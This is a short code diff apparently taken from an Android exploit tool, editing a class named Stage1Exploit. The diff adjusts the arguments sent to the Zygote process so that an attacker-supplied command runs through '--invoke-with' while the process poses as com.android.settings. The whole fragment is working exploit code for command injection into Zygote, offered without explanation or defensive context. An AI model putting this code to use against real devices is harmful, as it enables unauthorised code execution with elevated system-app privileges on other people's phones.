@@ -193,10 +193,14 @@ class Stage1Exploit:
             "--runtime-args",
             "--seinfo=platform",
             "--nice-name=com.android.settings",
-            "--app-data-dir=/data/data/com.android.settings",
+            "--mount-external-default",
             "--runtime-flags=1",
             "--invoke-with",
             f"{command}#",
+            "--target-sdk-version=28",
+            "--instruction-set=arm",
+            "--app-data-dir=/data/data/com.android.settings",
+            "--package-name=com.android.settings",
             "android.app.ActivityThread",
         ]
         zygote_arguments = "\n".join(
